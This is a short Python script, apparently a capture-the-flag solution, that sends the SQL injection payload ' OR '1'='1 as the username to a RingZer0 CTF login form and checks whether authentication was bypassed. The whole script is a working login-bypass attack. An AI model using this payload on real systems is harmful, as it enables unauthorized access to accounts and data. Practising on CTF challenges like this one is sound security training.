import requests

url = 'http://challenges.ringzer0ctf.com:10124/'
payload = "' OR '1'='1"
data = {
    'username': payload,
    'password': 'test'
}

response = requests.post(url, data=data)

if "Wrong username or password" not in response.text:
    print("[+] Injection réussie !")
    print(response.text)
else:
    print("[-] Échec de l'injection.")
